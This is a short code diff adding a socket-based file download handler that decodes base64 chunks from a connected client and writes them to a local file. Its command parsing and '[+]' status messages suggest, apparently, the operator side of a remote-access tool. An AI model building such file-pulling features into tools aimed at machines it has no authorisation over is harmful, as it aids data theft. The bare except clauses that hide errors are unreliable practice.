@@ -21,5 +21,22 @@ def handle_download(client_socket, command):
 
         file_path = command[9:].strip() or file_info["name"]
 
+        try:
+            with open(file_path, "wb") as fp:
+                received_bytes = 0
+                while received_bytes < file_info["size"]:
+                    chunk_data = socket_recv(client_socket)
+
+                    if (
+                        chunk_data.startswith("Error")
+                        or chunk_data == "[+] File Transfer Complete"
+                    ):
+                        break
+
+                    chunk = base64.b64decode(chunk_data)
+                    fp.write(chunk)
+                    received_bytes += len(chunk)
+        except:
+            pass
     except:
         pass
